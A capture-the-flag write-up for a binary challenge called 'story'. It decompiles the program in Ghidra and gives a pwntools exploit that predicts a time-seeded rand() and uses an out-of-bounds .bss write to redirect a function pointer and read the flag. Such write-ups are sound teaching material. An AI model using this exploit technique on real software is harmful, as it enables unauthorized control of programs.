### Problem statement

In this challenge we were given a binary file. On running ```checksec``` on the binary, we see
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   57 Symbols        No    0               2               story
```
We can see that the canary is disabled but all other protections are enabled.

### Analysis in Ghidra

Decompiled main looks something like this
```
undefined8 main(void)

{
  __gid_t __rgid;
  int iVar1;
  time_t tVar2;
  
  setvbuf(stdout,(char *)0x0,2,0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  tVar2 = time((time_t *)0x0);
  srand((uint)(tVar2 / 0x3c));
  puts("Welcome to the game");
  puts("Guess four numbers in a row to pass to next level");
  iVar1 = random_check();
  if (iVar1 != 0) {
    vuln();
  }
  return 0;
}

```
Here we have a ```vuln``` function that can only be accessed once we pass the random checks. The ```random_check``` function looks like this:
```
undefined8 random_check(void)

{
  int iVar1;
  long lVar2;
  char local_1e [10];
  int local_14;
  undefined4 local_10;
  int local_c;
  
  local_c = 0;
  while( true ) {
    if (3 < local_c) {
      return 1;
    }
    local_10 = 0;
    printf("Enter your guess: ");
    fgets(local_1e,0x28,stdin);
    lVar2 = atol(local_1e);
    local_14 = (int)lVar2;
    iVar1 = rand();
    if (local_14 != iVar1 % 1000) break;
    printf("[%d/4] Your guess was right.\n",(ulong)(local_c + 1));
    local_c = local_c + 1;
  }
  puts("You made a wrong guess.\nBetter luck next time.");
  return 0;
}

```
In order to pass this, we need to provide 4 random values that match the output of ```rand``` function. Since the seed for ```srand``` can be predicted, we can easily pass these checks.
The decompiled vuln function looks something like this
```
void vuln(void)

{
  size_t sVar1;
  int local_60;
  int local_5c;
  char local_58 [72];
  
  printf("\nWrite a few words about the game ");
  __isoc99_scanf("%100s",local_58);
  puts("So now give me two of your lucky numbers and both must be less than 1000: ");
  __isoc99_scanf("%d %d",&local_5c,&local_60);
  if (local_5c < 1000) {
    *(int *)(fun + (long)local_5c * 4) = *(int *)(fun + (long)local_5c * 4) + local_60;
  }
  sVar1 = strlen(local_58);
  hard_set_winner(local_58,sVar1);
  return;
}

```
Here we have a buffer overflow in scanf. There is also arbitrary write in .bss section using the fun variable. On looking at the disassembly of vuln function, I saw that the call to ```hard_set_winner``` is done using the value stored in another variable called ```check```. It initially stores the address of ```hard_set_winner```. This is the decompiled code of ```hard_set_winner```
```

void hard_set_winner(undefined8 param_1,undefined8 param_2)

{
  int iVar1;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  FILE *local_10;
  
  iVar1 = calculate_desc(param_1,param_2);
  if (iVar1 == 0xbd3a58) {
    local_58 = 0;
    local_50 = 0;
    local_48 = 0;
    local_40 = 0;
    local_38 = 0;
    local_30 = 0;
    local_28 = 0;
    local_20 = 0;
    local_10 = fopen("flag.txt","r");
    fgets((char *)&local_58,0x40,local_10);
    puts("You\'re a good story teller. Here\'s the flag.");
    puts((char *)&local_58);
  }
  else {
    puts("Youe story was not good.");
  }
  return;

```
The ```calculate_desc``` function is nothing but the sum of values in the input string. As the check says that this value should be **0xbd3a58** which is **12401240** in decimal. This is not possible to get using an input string of 100 length. 

In the binary we also see another function ```easy_set_winner```, where the input sum is compared to **0x4d8** which is just **1240**. This seems managable.

### Attack idea

The attack idea is simple, since we are given an arbitrary write in .bss in the line 
```
  if (local_5c < 1000) {
    *(int *)(fun + (long)local_5c * 4) = *(int *)(fun + (long)local_5c * 4) + local_60;
  }
```
we can use this to update the value of ```check``` variable which is located at an offset of ```0x30``` from ```fun```. We update it to make it point to ```easy_set_winner``` and then we can craft an input string such that it's sum is equal to 1240, and thus get the flag. The exploit is pretty straightforward.

### Exploit

```
from pwn import *
from ctypes import CDLL

p = remote("story.ctf.pragyan.org", 6004)
#p = process("./story")
libc = CDLL("libc.so.6")
libc.srand(libc.time(0)//0x3c)
gdbscript = """
    br *vuln
"""
context.terminal = ["tmux", "splitw", "-h"]

#gdb.attach(p, gdbscript)

p.recvuntil(b"Guess four numbers in a row to pass to next level")
for i in range(4):
    p.recvuntil(b"Enter your guess: ")
    num = libc.rand()
    num = num % 1000
    p.sendline(str(num).encode())

payload = b"\x7c"*10
p.sendline(payload)
p.recvuntil(b"So now give me two")
p.sendline(b"-12 -211")
p.recvuntil(b"the flag.\n")
p.interactive()
```